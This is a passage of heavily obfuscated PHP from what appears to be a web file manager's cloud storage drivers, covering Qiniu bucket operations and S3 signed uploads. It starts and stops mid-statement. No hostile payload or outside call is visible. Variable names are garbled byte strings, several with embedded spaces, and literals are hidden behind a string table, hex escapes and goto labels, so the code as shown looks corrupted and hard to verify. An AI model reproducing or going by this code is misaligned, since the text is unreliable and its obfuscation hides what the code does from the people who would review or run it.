substr(md5($ùŠ ³îà[771] . $§ã„±Ê” . $ÅÌµ¢Æ), 0, 8); return "\x7b\151\157\x3a{$˜¶æ«ï[$ùŠ ³îà[751]]}\175\x2f\x64\141\x74\141\x62\x61\163\145\x2f\142\141\143\153\x75\x70\x2f" . $ÅÌµ¢Æ . $ùŠ ³îà[71] . $åìÇÔã§; } private function tmpFilesPath() { $¬ê½¿½¾ =& $_SERVER[Ù×¯Ø…]; $íƒ²ù²™ = TEMP_FILES; if ($GLOBALS[$¬ê½¿½¾[6]][$¬ê½¿½¾[88]][$¬ê½¿½¾[801]]) { $íƒ²ù²™ = $GLOBALS[$¬ê½¿½¾[6]][$¬ê½¿½¾[88]][$¬ê½¿½¾[801]]; if (!mk_dir($íƒ²ù²™) || !is_writable($íƒ²ù²™) || !IO::mkfile($íƒ²ù²™ . $¬ê½¿½¾[802])) { $íƒ²ù²™ = TEMP_FILES; } } return $íƒ²ù²™; } } goto DƒÂ—µø™«; CíˆÚ‚ÈÔ : class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public function __construct($‘Ì‘ÆšŸ) { parent::__construct(); require_once SDK_DIR . $_SERVER[Ù×¯Ø…][1349]; $this->_init($‘Ì‘ÆšŸ); } public function _init($éôËÖë) { $ÙºÙôïª =& $_SERVER[Ù×¯Ø…]; foreach ($éôËÖë as $å¨ŞÔ => $¯ä¬†ÅÏ) { if (isset($this->{$å¨ŞÔ})) { $this->{$å¨ŞÔ} = $¯ä¬†ÅÏ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($ÙºÙôïª[1350] . LNG($ÙºÙôïª[1310])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($šúÊÌ÷÷, $úçøé¤ = '', $İ³İ¹í¯ = REPEAT_RENAME) { if ($this->setContent($šúÊÌ÷÷, $úçøé¤)) { return $this->getPathOuter($šúÊÌ÷÷); } return !1; } public function mkdir($Äò±”ƒù, $ñìãæ¾ = REPEAT_SKIP) { $¯Œì–ª± =& $_SERVER[Ù×¯Ø…]; $ßÍ»œÔÏ = trim($Äò±”ƒù, $¯Œì–ª±[8]); if ($this->_isFolder($ßÍ»œÔÏ)) { return $this->getPathOuter($ßÍ»œÔÏ); } $Äò±”ƒù = $ßÍ»œÔÏ . $¯Œì–ª±[8]; $¼­¿·¥„ = get_path_this($ßÍ»œÔÏ); $²‹ÚÓ© = $Äò±”ƒù . $¼­¿·¥„; if (!$this->mkfile($²‹ÚÓ©)) { return !1; } if (!$this->moveFile($²‹ÚÓ©, $Äò±”ƒù)) { $this->delFile($²‹ÚÓ©); return !1; } return $this->getPathOuter($ßÍ»œÔÏ); } public function copyFile($òãŸ¡Õú, $¼‚›’æŒ) { $Ïä²·† = $this->bucketManager->copy($this->bucket, $òãŸ¡Õú, $this->bucket, $¼‚›’æŒ, !0); return $Ïä²·† ? !1 : $this->getPathOuter($¼‚›’æŒ); } public function moveFile($“ÅÁÃ…é, $éÛæç€§) { $çóˆõŒÅ = $this->bucketManager->move($this->bucket, $“ÅÁÃ…é, $this->bucket, $éÛæç€§, !0); return $çóˆõŒÅ ? !1 : $this->getPathOuter($éÛæç€§); } public function delFile($ÅÉĞ€µ®) { if (!$this->exist($ÅÉĞ€µ®)) { return !0; } $ÛÚ¹Ì‚ñ = $this->bucketManager->delete($this->bucket, $ÅÉĞ€µ®); return $ÛÚ¹Ì‚ñ ? !1 : !0; } public function delFolder($Æ¸şÒ¬ˆ) { $ÜâŸÇ—‰ =& $_SERVER[Ù×¯Ø…]; if (!$this->exist($Æ¸şÒ¬ˆ)) { return !0; } $this->listItemCache = !1; $š½¶‰£‚ = $this->fileList($Æ¸şÒ¬ˆ); $this->listItemCache = !0; $ÒãÆ¿°Å = trim($Æ¸şÒ¬ˆ, $ÜâŸÇ—‰[8]) . $ÜâŸÇ—‰[8]; if (!empty($Æ¸şÒ¬ˆ) && $Æ¸şÒ¬ˆ !== $ÜâŸÇ—‰[191] && !in_array($ÒãÆ¿°Å, $š½¶‰£‚[$ÜâŸÇ—‰[75]])) { $š½¶‰£‚[$ÜâŸÇ—‰[75]][] = $ÒãÆ¿°Å; } $ÛÆî„Ò‚ = $this->delByBatch($š½¶‰£‚[$ÜâŸÇ—‰[74]]); if (!$ÛÆî„Ò‚) { return !1; } $ÛÆî„Ò‚ = $this->delByBatch($š½¶‰£‚[$ÜâŸÇ—‰[75]]); if (!$ÛÆî„Ò‚) { return !1; } return $this->delFile($ÒãÆ¿°Å); } private function delByBatch($Ä„ÑÇÕ) { foreach (array_chunk($Ä„ÑÇÕ, 1000) as $î„Ó¼Ë) { $«É…‚Êá = $this->bucketManager->buildBatchDelete($this->bucket, $î„Ó¼Ë); list($ÒÖ¯¿¦·, $’Ï›ğ…î) = $this->bucketManager->batch($«É…‚Êá); if ($’Ï›ğ…î) { return !1; } } return !0; } public function rename($§ßä‘, $ƒ¥§¾) { return $this->renameObject($§ßä‘, $ƒ¥§¾); } public function fileInfo($Û¯‡”Çï, $˜÷´Ö»  = false, $‰àö–øş = array()) { $³…Ó° =& $_SERVER[Ù×¯Ø…]; $ƒËåÔÈ = array($³…Ó°[28] => $this->pathThis($Û¯‡”Çï), $³…Ó°[76] => $this->getPathOuter($³…Ó°[8] . $Û¯‡”Çï), $³…Ó°[29] => $³…Ó°[193], $³…Ó°[78] => isset($‰àö–øş[$³…Ó°[1351]]) ? $‰àö–øş[$³…Ó°[1351]] : 0, $³…Ó°[168] => $this->ext($Û¯‡”Çï)); if ($˜÷´Ö» ) { return $ƒËåÔÈ; } $ƒËåÔÈ[$³…Ó°[194]] = $ƒËåÔÈ[$³…Ó°[84]] = 0; $ƒËåÔÈ[$³…Ó°[195]] = $ƒËåÔÈ[$³…Ó°[196]] = !0; if (empty($‰àö–øş)) { $‰àö–øş = $this->objectMeta($Û¯‡”Çï); if (!$‰àö–øş) { return $ƒËåÔÈ; } } if (isset($‰àö–øş[$³…Ó°[1352]])) { $ƒËåÔÈ[$³…Ó°[84]] = substr($‰àö–øş[$³…Ó°[1352]] . $³…Ó°[33], 0, 10); } if (isset($‰àö–øş[$³…Ó°[1351]])) { $ƒËåÔÈ[$³…Ó°[78]] = $‰àö–øş[$³…Ó°[1351]]; } return $ƒËåÔÈ; } public function folderInfo($éÒş¯Æ—, $Á†ĞÂ‰š = false) { $Ú¾Ãá÷Ù =& $_SERVER[Ù×¯Ø…]; $ĞèÌ´»Ó = array($Ú¾Ãá÷Ù[28] => $this->pathThis($éÒş¯Æ—), $Ú¾Ãá÷Ù[76] => $this->getPathOuter($Ú¾Ãá÷Ù[8] . $éÒş¯Æ—), $Ú¾Ãá÷Ù[29] => $Ú¾Ãá÷Ù[77]); if ($Á†ĞÂ‰š) { return $ĞèÌ´»Ó; } $ĞèÌ´»Ó[$Ú¾Ãá÷Ù[194]] = $ĞèÌ´»Ó[$Ú¾Ãá÷Ù[84]] = 0; $ĞèÌ´»Ó[$Ú¾Ãá÷Ù[195]] = $ĞèÌ´»Ó[$Ú¾Ãá÷Ù[196]] = !0; $éÒş¯Æ— = rtrim($éÒş¯Æ—, $Ú¾Ãá÷Ù[8]) . $Ú¾Ãá÷Ù[8]; $Ä÷’½—‡ = $this->objectMeta($éÒş¯Æ—); if (isset($Ä÷’½—‡[$Ú¾Ãá÷Ù[1352]])) { $ĞèÌ´»Ó[$Ú¾Ãá÷Ù[84]] = substr($Ä÷’½—‡[$Ú¾Ãá÷Ù[1352]] . $Ú¾Ãá÷Ù[33], 0, 10); } return $ĞèÌ´»Ó; } public function listPath($Ã¥¢¢›®, $ïÅ€ô¶ = false) { $½ÁåîÚ“ =& $_SERVER[Ù×¯Ø…]; $òÏ¾¾Ö = $this->fileList($Ã¥¢¢›®, $½ÁåîÚ“[8], !0); foreach ($òÏ¾¾Ö[$½ÁåîÚ“[75]] as $·–¼Æ™° => $Ùºö§Ê) { $òÏ¾¾Ö[$½ÁåîÚ“[75]][$·–¼Æ™°] = $this->folderInfo($Ùºö§Ê, $ïÅ€ô¶); } foreach ($òÏ¾¾Ö[$½ÁåîÚ“[74]] as $·–¼Æ™° => $Ùºö§Ê) { $òÏ¾¾Ö[$½ÁåîÚ“[74]][$·–¼Æ™°] = $this->fileInfo($Ùºö§Ê[$½ÁåîÚ“[93]], $ïÅ€ô¶, $Ùºö§Ê); } return $òÏ¾¾Ö; } public function has($–À½®Ş”, $¶‹ˆ¦çª = false, $˜©šù×­ = true) { $‰«îÊ§ =& $_SERVER[Ù×¯Ø…]; $–À½®Ş” = trim($–À½®Ş”, $‰«îÊ§[8]); $ø­‘êÔ¡ = empty($–À½®Ş”) && $–À½®Ş” !== $‰«îÊ§[191] ? $‰«îÊ§[33] : $–À½®Ş” . $‰«îÊ§[8]; $£ñ¥Üû = $‰«îÊ§[33]; $û”ãùÙï = 500; $‡å—ºÈ¡ = $‰«îÊ§[8]; $¿Öûõ¸ = $„÷òâ¾± = 0; while (!0) { check_abort(); list($óûş¢÷ï, $î¢æÎù¾) = $this->bucketManager->listFiles($this->bucket, $ø­‘êÔ¡, $£ñ¥Üû, $û”ãùÙï, $‡å—ºÈ¡); if ($î¢æÎù¾) { break; } $£ñ¥Üû = array_key_exists($‰«îÊ§[1322], $óûş¢÷ï) ? $£ñ¥Üû = $óûş¢÷ï[$‰«îÊ§[1353]] : $‰«îÊ§[33]; if ($¶‹ˆ¦çª) { if (!empty($óûş¢÷ï[$‰«îÊ§[1354]])) { $¿Öûõ¸ += count($óûş¢÷ï[$‰«îÊ§[1354]]); } if (!empty($óûş¢÷ï[$‰«îÊ§[1355]])) { $„÷òâ¾± += count($óûş¢÷ï[$‰«îÊ§[1355]]); } if ($£ñ¥Üû === $‰«îÊ§[33]) { break; } continue; } if ($˜©šù×­) { if (!empty($óûş¢÷ï[$‰«îÊ§[1354]])) { return !0; } } else { if (!empty($óûş¢÷ï[$‰«îÊ§[1355]])) { return !0; } } if ($£ñ¥Üû === $‰«îÊ§[33]) { break; } } if ($¶‹ˆ¦çª) { return array($‰«îÊ§[203] => $¿Öûõ¸, $‰«îÊ§[204] => $„÷òâ¾±); } return !1; } public function listAll($´€ş‡â) { $—µ‘†¿ =& $_SERVER[Ù×¯Ø…]; $ÎĞÏ³¥Æ = $this->fileList($´€ş‡â, $—µ‘†¿[33], !0); $ğíÏ˜ô‹ = array(); foreach ($ÎĞÏ³¥Æ[$—µ‘†¿[74]] as $‰’®¥Éë) { $ğíÏ˜ô‹[$‰’®¥Éë[$—µ‘†¿[93]]] = $‰’®¥Éë[$—µ‘†¿[78]]; } foreach ($ÎĞÏ³¥Æ[$—µ‘†¿[75]] as $‰’®¥Éë) { if (is_string($‰’®¥Éë)) { $ğíÏ˜ô‹[$‰’®¥Éë] = 0; } } return $this->listAllFiles($´€ş‡â, array_keys($ğíÏ˜ô‹), $ğíÏ˜ô‹); } private function fileList($‡ ™ŒÏÎ, $Í¯ñÄ¨Ó = '', $“óÇ€˜ = 0) { $í·§„± =& $_SERVER[Ù×¯Ø…]; $‡ ™ŒÏÎ = trim($‡ ™ŒÏÎ, $í·§„±[8]); $ğş¥ÕÕÊ = empty($‡ ™ŒÏÎ) && $‡ ™ŒÏÎ !== $í·§„±[191] ? $í·§„±[33] : $‡ ™ŒÏÎ . $í·§„±[8]; $îƒ¹Æˆş = $í·§„±[33]; $ªÖé–ı = 1000; $²‘›‚ÁÜ = $this->listItemCache === !1 ? !1 : !0; $›¢Û±îÄ = $ä¨ˆü£´ = array(); while (!0) { check_abort(); list($Œ°õÓÎğ, $«¿ë÷Ò) = $this->bucketManager->listFiles($this->bucket, $ğş¥ÕÕÊ, $îƒ¹Æˆş, $ªÖé–ı, $Í¯ñÄ¨Ó); if ($«¿ë÷Ò) { break; } $îƒ¹Æˆş = array_key_exists($í·§„±[1322], $Œ°õÓÎğ) ? $îƒ¹Æˆş = $Œ°õÓÎğ[$í·§„±[1353]] : $í·§„±[33]; $œÄ­îÀò = isset($Œ°õÓÎğ[$í·§„±[1354]]) ? $Œ°õÓÎğ[$í·§„±[1354]] : array(); $´ûÊ¼Ş³ = isset($Œ°õÓÎğ[$í·§„±[1355]]) ? $Œ°õÓÎğ[$í·§„±[1355]] : array(); foreach ($œÄ­îÀò as $©†ŞõÅØ) { if ($©†ŞõÅØ[$í·§„±[93]] == $ğş¥ÕÕÊ) { continue; } $•ĞÄÕ½¹ = $©†ŞõÅØ[$í·§„±[93]]; $Æ²¿©ß‡ = $©†ŞõÅØ[$í·§„±[1351]]; $©†ŞõÅØ[$í·§„±[78]] = $Æ²¿©ß‡; $°¸†Õİ¬ = $Æ²¿©ß‡ == 0 && substr($•ĞÄÕ½¹, strlen($•ĞÄÕ½¹) - 1, 1) == $í·§„±[8] ? !0 : !1; if ($²‘›‚ÁÜ) { $this->cacheMethod($í·§„±[199], $•ĞÄÕ½¹, $°¸†Õİ¬); $this->cacheMethod($í·§„±[200], $•ĞÄÕ½¹, $©†ŞõÅØ); } if ($°¸†Õİ¬) { $›¢Û±îÄ[] = $•ĞÄÕ½¹; continue; } $ä¨ˆü£´[] = $“óÇ€˜ ? $©†ŞõÅØ : $•ĞÄÕ½¹; } foreach ($´ûÊ¼Ş³ as $•ĞÄÕ½¹) { if ($•ĞÄÕ½¹ == $ğş¥ÕÕÊ) { continue; } $›¢Û±îÄ[] = $•ĞÄÕ½¹; if ($²‘›‚ÁÜ) { $this->cacheMethod($í·§„±[199], $•ĞÄÕ½¹, !0); } } if ($îƒ¹Æˆş === $í·§„±[33]) { break; } } if ($²‘›‚ÁÜ) { $this->cacheMethod($í·§„±[199], $‡ ™ŒÏÎ, !0); } return array($í·§„±[75] => $›¢Û±îÄ, $í·§„±[74] => $ä¨ˆü£´); } public function canRead($î‹“Á´) { return $this->exist($î‹“Á´) ? !0 : !1; } public function canWrite($ÆÊ¸ë·’) { return $this->exist($ÆÊ¸ë·’) ? !0 : !1; } public function getContent($»Ä¢¬–) { return $this->fileSubstr($»Ä¢¬–, 0, -1); } public function setContent($š¡æÙòÊ, $£¼…Äõ´ = '') { $½ø›ş”· = $this->tempFile($this->pathThis($š¡æÙòÊ)); file_put_contents($½ø›ş”·, $£¼…Äõ´); if ($this->upload($š¡æÙòÊ, $½ø›ş”·)) { $this->tempFileRemve($½ø›ş”·); return !0; } return !1; } public function refreshUrls($•ëİ§–·) { $ôœÇç÷‚ =& $_SERVER[Ù×¯Ø…]; $Š¢àÇ§˜ = array(); if (is_array($•ëİ§–·)) { foreach ($•ëİ§–· as $¡ôÛŒò½) { $Š¢àÇ§˜[] = $this->link($¡ôÛŒò½); } } else { $Š¢àÇ§˜[] = $this->link($•ëİ§–·); } $ÖáÈÏÃ³ = new Qiniu\Cdn\CdnManager($this->auth); list($««ï§—©, $ì°²Üüó) = $ÖáÈÏÃ³->refreshUrls($Š¢àÇ§˜); if ($ì°²Üüó) { return !1; } return $««ï§—©[$ôœÇç÷‚[1113]] == $ôœÇç÷‚[759] ? !0 : !1; } public function fileSubstr($–×ø´·, $ÌŞÅòª, $Üó±€ùâ) { $Ÿæö£Ãæ =& $_SERVER[Ù×¯Ø…]; if (!($ìÖÊ¡¸ = $this->link($–×ø´·))) { return !1; } $ß°ÛÇ = !1; if ($Üó±€ùâ > 0) { $äôıÕŸ = $ÌŞÅòª + $Üó±€ùâ - 1; $ß°ÛÇ = array($Ÿæö£Ãæ[1356] . $ÌŞÅòª . $Ÿæö£Ãæ[463] . $äôıÕŸ); } $ò¼ÍÌ…ì = url_request($ìÖÊ¡¸, $Ÿæö£Ãæ[228], !1, $ß°ÛÇ); return $ò¼ÍÌ…ì[$Ÿæö£Ãæ[749]] ? $ò¼ÍÌ…ì[$Ÿæö£Ãæ[1123]] : !1; } public function upload($Šıµ¶„µ, $øË”é, $¤¿»¨åè = false, $¶æıÆ”Û = REPEAT_REPLACE) { $Ìˆ…³²÷ = new Qiniu\Storage\UploadManager(); $¶…ƒ’ê = $this->auth->uploadToken($this->bucket, $Šıµ¶„µ); $ÈÜ§£®® = get_file_mime(get_path_ext($øË”é)); list($¨²Ú÷¿, $‡æøãÊ†) = $Ìˆ…³²÷->putFile($¶…ƒ’ê, $Šıµ¶„µ, $øË”é, null, $ÈÜ§£®®); return $‡æøãÊ† ? !1 : $this->getPathOuter($Šıµ¶„µ); } public function uploadFormData($•è¾Û’, $âş‘‚ŒŸ = 3600) { return $this->uploadToken($•è¾Û’, $âş‘‚ŒŸ); } public function multiUploadFormData($øÁÍø„¡, $ê´üÁ… = 3600) { return $this->uploadToken($øÁÍø„¡, $ê´üÁ…); } private function uploadToken($¶ÌÓ±íé, $²ª”Û¹‡ = 3600) { $œÚïÛì =& $_SERVER[Ù×¯Ø…]; $Ø˜°¯Ôº = $²ª”Û¹‡; $ç˜š = array($œÚïÛì[1357] => $œÚïÛì[1358]); $ìÚà¦Ó‚ = $¶ÌÓ±íé; $¯•³Äç = $this->auth->uploadToken($this->bucket, $ìÚà¦Ó‚, $Ø˜°¯Ôº, $ç˜š, !0); $ïÆâÅ´ğ = empty($this->region) || $this->region == $œÚïÛì[1359] ? $œÚïÛì[33] : $œÚïÛì[463] . $this->region; $şÓ”Û¹Ã = http_type() . "\x3a\x2f\x2f\165\160\154\157\141\144{$ïÆâÅ´ğ}\56\x71\151\156\151\x75\x70\x2e\143\157\155\x2f"; return array($œÚïÛì[1360] => $¯•³Äç, $œÚïÛì[1361] => $şÓ”Û¹Ã); } public function download($†Ô‰“¥ï, $ÒÖâ×Ùâ) { $ÈòĞÒ™– = IO::getPathInner(IO::mkfile($ÒÖâ×Ùâ)); if (!($âËÆœ«â = $this->link($†Ô‰“¥ï))) { return !1; } $ÉçÅ…Éú = 0; $Ö†Œš«¦ = 1024 * 200; $³–ê¶åã = fopen($ÈòĞÒ™–, $_SERVER[Ù×¯Ø…][1362]); while (!0) { $½˜¹ù¯† = $this->fileSubstr($†Ô‰“¥ï, $ÉçÅ…Éú, $Ö†Œš«¦); if ($½˜¹ù¯† === !1) { return !1; } fwrite($³–ê¶åã, $½˜¹ù¯†); $ÉçÅ…Éú += $Ö†Œš«¦; if (strlen($½˜¹ù¯†) < $Ö†Œš«¦) { break; } } fclose($³–ê¶åã); return $ÒÖâ×Ùâ; } public function link($™ŸÊæµë, $£ÌöÔËÇ = '') { if (!$this->isFile($™ŸÊæµë)) { return !1; } $½àÈ¨Ãø = $this->getHost() . $_SERVER[Ù×¯Ø…][8] . $this->pathEncode($™ŸÊæµë) . $£ÌöÔËÇ; return $this->auth->privateDownloadUrl($½àÈ¨Ãø, 3600 * 12); } public function fileOut($Õª¢ÙŞÇ, $†¹ÆËÛÍ = false, $ûå®Àşô = false, $«‡æÑ¢ç = '') { $õİ»¢½½ =& $_SERVER[Ù×¯Ø…]; if ($this->isFileOutServer()) { return $this->fileOutServer($Õª¢ÙŞÇ, $†¹ÆËÛÍ, $ûå®Àşô, $«‡æÑ¢ç); } if (!$ûå®Àşô) { $ûå®Àşô = $this->pathThis($Õª¢ÙŞÇ); } $Ì¹ºÑ„ô = $†¹ÆËÛÍ ? $õİ»¢½½[1363] . rawurlencode($ûå®Àşô) : $õİ»¢½½[33]; $³ÙÚÇßÈ = $this->link($Õª¢ÙŞÇ, $Ì¹ºÑ„ô); $this->fileOutLink($³ÙÚÇßÈ); } public function fileOutServer($¦è´ÃüË, $ªáÉ„è– = false, $ôÖçÙ = false, $›”Â‹µŠ = '') { parent::fileOut($¦è´ÃüË, $ªáÉ„è–, $ôÖçÙ, $›”Â‹µŠ); } public function fileOutImage($ƒçâí—ã, $¢Ã´Åæ° = 250) { $¨›ËÛ¹ç = $this->link($ƒçâí—ã, $_SERVER[Ù×¯Ø…][1364] . $¢Ã´Åæ°); $this->fileOutLink($¨›ËÛ¹ç); } public function fileOutImageServer($Í¤½Âçş, $Å˜€Ä¾Ö = 250) { parent::fileOutImage($Í¤½Âçş, $Å˜€Ä¾Ö); } public function hashMd5($¤Ò›Ìœ½) { $ã¶™ğ¾Ş =& $_SERVER[Ù×¯Ø…]; $êßï´¾ = $this->objectMeta($¤Ò›Ìœ½); return isset($êßï´¾[$ã¶™ğ¾Ş[208]]) ? $êßï´¾[$ã¶™ğ¾Ş[208]] : !1; $’üàÛÈ£ = $this->link($¤Ò›Ìœ½, $ã¶™ğ¾Ş[1365]); } public function size($ •) { $¹ú¨°Ó = $this->objectMeta($ •); return $¹ú¨°Ó ? $¹ú¨°Ó[$_SERVER[Ù×¯Ø…][78]] : 0; } public function info($îåÅô†—) { if ($this->isFolder($îåÅô†—)) { return $this->folderInfo($îåÅô†—); } else { if ($this->isFile($îåÅô†—)) { return $this->fileInfo($îåÅô†—); } } return !1; } public function exist($²¤¶ë÷Ç) { return $this->isFile($²¤¶ë÷Ç) || $this->isFolder($²¤¶ë÷Ç); } public function isFile($Áú¾ßãº) { return !$this->isFolder($Áú¾ßãº) && $this->objectMeta($Áú¾ßãº); } public function isFolder($æš±ø’š) { return $this->cacheMethod($_SERVER[Ù×¯Ø…][199], $æš±ø’š); } protected function objectMeta($Øˆ›¹Ÿ) { return $this->cacheMethod($_SERVER[Ù×¯Ø…][200], $Øˆ›¹Ÿ); } protected function _objectMeta($çî¶·œ) { $Üãç¦½ =& $_SERVER[Ù×¯Ø…]; list($¥­¦™Œ“, $øÂØ¶àÜ) = $this->bucketManager->stat($this->bucket, $çî¶·œ); if ($¥­¦™Œ“) { $¥­¦™Œ“[$Üãç¦½[78]] = intval($¥­¦™Œ“[$Üãç¦½[1351]]); } return $¥­¦™Œ“; } protected function _isFolder($ƒÖ Ö˜”) { $õˆì™°³ =& $_SERVER[Ù×¯Ø…]; if ($ƒÖ Ö˜” == $õˆì™°³[33] || $ƒÖ Ö˜” == $õˆì™°³[8]) { return !0; } list($î¯áıçğ, $ÜÛÉ³) = $this->bucketManager->listFiles($this->bucket, trim($ƒÖ Ö˜”, $õˆì™°³[8]) . $õˆì™°³[8], $õˆì™°³[33], 1, $õˆì™°³[8]); return !empty($î¯áıçğ[$õˆì™°³[1354]]) || !empty($î¯áıçğ[$õˆì™°³[1355]]) ? !0 : !1; } } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($¬ıƒïÍ) { parent::__construct($¬ıƒïÍ); } public function uploadFormData($Æå½ŸÎ§, $‹‹ØâéÍ = 3600) { $ä¡¸âÔÊ =& $_SERVER[Ù×¯Ø…]; $ı¡˜ÜÉ = $ä¡¸âÔÊ[192]; $˜«–üãœ = $ä¡¸âÔÊ[1272]; $ÚˆùºÁ› = $ä¡¸âÔÊ[59]; $²ø·ğ¢§ = gmdate($ä¡¸âÔÊ[1273]); $Â­œûò = gmdate($ä¡¸âÔÊ[750]); $ØçæÎ¤û = $ä¡¸âÔÊ[1274]; $ÒÉßíÈ = $‹‹ØâéÍ . $ä¡¸âÔÊ[33]; $ƒÑ¾‚Ïô = $ä¡¸âÔÊ[1236]; $æ÷ßó‰¾ = array($this->accessKey, $Â­œûò, $this->region, $ÚˆùºÁ›, $ØçæÎ¤û); $åÖ¼ĞË™ = implode($ä¡¸âÔÊ[8], $æ÷ßó‰¾); $îù™Í  = array($ä¡¸âÔÊ[1238] => gmdate($ä¡¸âÔÊ[1237], strtotime($ä¡¸âÔÊ[1275])), $ä¡¸âÔÊ[1239] => array(array($ä¡¸âÔÊ[1241] => $this->bucket), array($ä¡¸âÔÊ[1240] => $ı¡˜ÜÉ), array($ä¡¸âÔÊ[1242], $ä¡¸âÔÊ[1243], $ä¡¸âÔÊ[33]), array($ä¡¸âÔÊ[1242], $ä¡¸âÔÊ[1276], $ä¡¸âÔÊ[33]), array($ä¡¸âÔÊ[1242], $ä¡¸âÔÊ[1277], $ä¡¸âÔÊ[33]), array($ä¡¸âÔÊ[1244] => $ƒÑ¾‚Ïô), array($ä¡¸âÔÊ[1278] => $åÖ¼ĞË™), array($ä¡¸âÔÊ[1279] => $˜«–üãœ), array($ä¡¸âÔÊ[1280] => $²ø·ğ¢§), array($ä¡¸âÔÊ[1281] => $ÒÉßíÈ))); $áû¤¿Å = base64_encode(json_encode($îù™Í )); $ôÕÂØèğ = hash_hmac($ä¡¸âÔÊ[1282], $Â­œûò, $ä¡¸âÔÊ[1283] . $this->secret, !0); $ÆàáÙÖ = hash_hmac($ä¡¸âÔÊ[1282], $this->region, $ôÕÂØèğ, !0); $÷•ÆÆ¥ = hash_hmac($ä¡¸âÔÊ[1282], $ÚˆùºÁ›, $ÆàáÙÖ, !0); $ûÉÉŒî = hash_hmac($ä¡¸âÔÊ[1282], $ØçæÎ¤û, $÷•ÆÆ¥, !0); $”õŠîŸ = hash_hmac($ä¡¸âÔÊ[1282], $áû¤¿Å, $ûÉÉŒî); $çüÁè¶ = array($ä¡¸âÔÊ[211] => $ä¡¸âÔÊ[33], $ä¡¸âÔÊ[1284] => $ä¡¸âÔÊ[33], $ä¡¸âÔÊ[1240] => $ı¡˜ÜÉ, $ä¡¸âÔÊ[1244] => $ƒÑ¾‚Ïô, $ä¡¸âÔÊ[1248] => $áû¤¿Å, $ä¡¸âÔÊ[1285] => $åÖ¼ĞË™, $ä¡¸âÔÊ[1286] => $˜«–üãœ, $ä¡¸âÔÊ[1287] => $²ø·ğ¢§, $ä¡¸âÔÊ[1288] => $ÒÉßíÈ, $ä¡¸âÔÊ[1289] => $”õŠîŸ, $ä¡¸âÔÊ[175] => $this->getHost()); return $çüÁè¶; } public function multiUploadFormData($Û‚—ğĞ©, $í·ÚÎ ø = 3600) { $ºéÂŠöŠ =& $_SERVER[Ù×¯Ø…]; $¢»ÒâÜÇ = gmdate($ºéÂŠöŠ[1366]); $Ñ­ÒŞ£Ç = array(); $Š€†úÒ = $this->client->getUploadId($this->bucket, $Û‚—ğĞ©, $Ñ­ÒŞ£Ç); if (!$Š€†úÒ) { return !1; } return array($ºéÂŠöŠ[221] => $Š€†úÒ, $ºéÂŠöŠ[175] => $this->getHost() . $ºéÂŠöŠ[8] . $this->pathEncode($Û‚—ğĞ©), $ºéÂŠöŠ[222] => $¢»ÒâÜÇ, $ºéÂŠöŠ[93] => $Û‚—ğĞ©); } public function multiUploadAuthData($Â¥ö˜™, $ßœ¯¨ÆÈ = array()) { $Ú¨íÍ´– =& $_SERVER[Ù×¯Ø…]; $†é©ŸÈ = isset($ßœ¯¨ÆÈ[$Ú¨íÍ´–[168]]) ? $ßœ¯¨ÆÈ[$Ú¨íÍ´–[168]] : $Ú¨íÍ´–[33]; $‡ƒõ™…õ = $ßœ¯¨ÆÈ[$Ú¨íÍ´–[93]]; unset($ßœ¯¨ÆÈ[$Ú¨íÍ´–[93]]); if (isset($ßœ¯¨ÆÈ[$Ú¨íÍ´–[223]])) { return $this->listUploadParts($‡ƒõ™…õ, $ßœ¯¨ÆÈ); } $Šë´íŒÑ = array(); if (isset($ßœ¯¨ÆÈ[$Ú¨íÍ´–[1367]])) { $Šë´íŒÑ[$Ú¨íÍ´–[1368]] = $ßœ¯¨ÆÈ[$Ú¨íÍ´–[1367]]; } $³¨Ö—ô• = explode($Ú¨íÍ´–[177], $this->getHost()); $†ıÊ¿‘ğ = array($Ú¨íÍ´–[1369] => $³¨Ö—ô•[1], $Ú¨íÍ´–[1370] => $Ú¨íÍ´–[33], $Ú¨íÍ´–[211] => $Ú¨íÍ´–[119], $Ú¨íÍ´–[1284] => $ßœ¯¨ÆÈ[$Ú¨íÍ´–[78]]); $óˆ†ã¤‰ = $Ú¨íÍ´–[226]; $¨ÙÌè¶Æ = $Ú¨íÍ´–[8] . $this->pathEncode($‡ƒõ™…õ) . $†é©ŸÈ; $Åôí¢›İ = $this->client->__getSignatureV4($Šë´íŒÑ, $†ıÊ¿‘ğ, $óˆ†ã¤‰, $¨ÙÌè¶Æ); if (strpos($†é©ŸÈ, $Ú¨íÍ´–[225]) === 0) { if (isset($Šë´íŒÑ[$Ú¨íÍ´–[1368]])) { $Ä¡¿õ‰ = $Šë´íŒÑ[$Ú¨íÍ´–[1368]]; } else { if (isset($Åôí¢›İ[$Ú¨íÍ´–[1368]])) { $Ä¡¿õ‰ = $Åôí¢›İ[$Ú¨íÍ´–[1368]]; } else { $Ä¡¿õ‰ = hash($Ú¨íÍ´–[1282], $Ú¨íÍ´–[33]); } } return array($Ú¨íÍ´–[232] => $Åôí¢›İ[$Ú¨íÍ´–[232]], $Ú¨íÍ´–[1368] => $Ä¡¿õ‰, $Ú¨íÍ´–[222] => $Åôí¢›İ[$Ú¨íÍ´–[1371]]); } return $Åôí¢›İ[$Ú¨íÍ´–[232]]; } public function listUploadParts($“çû–ê”, $İ€üÏß = array()) { $Æ–·íâò =& $_SERVER[Ù×¯Ø…]; $Ñ÷¸ñ† = str_replace($Æ–·íâò[233], $Æ–·íâò[33], $İ€üÏß[$Æ–·íâò[168]]); $—™¥ £¬ = $this->client->listParts($this->bucket, $“çû–ê”, $Ñ÷¸ñ†); if (!$—™¥ £¬) { return !1; } $ä§éïÚ« = $Æ–·íâò[1372]; foreach ($—™¥ £¬ as $ÕúîÃº‘) { $ä§éïÚ« .= $Æ–·íâò[1373] . "\74\x50\141\162\x74\116\x75\155\x62\145\x72\x3e{$ÕúîÃº‘[$Æ–·íâò[1329]]}\74\x2f\x50\141\162\x74\116\165\155\x62\145\162\x3e\xa" . 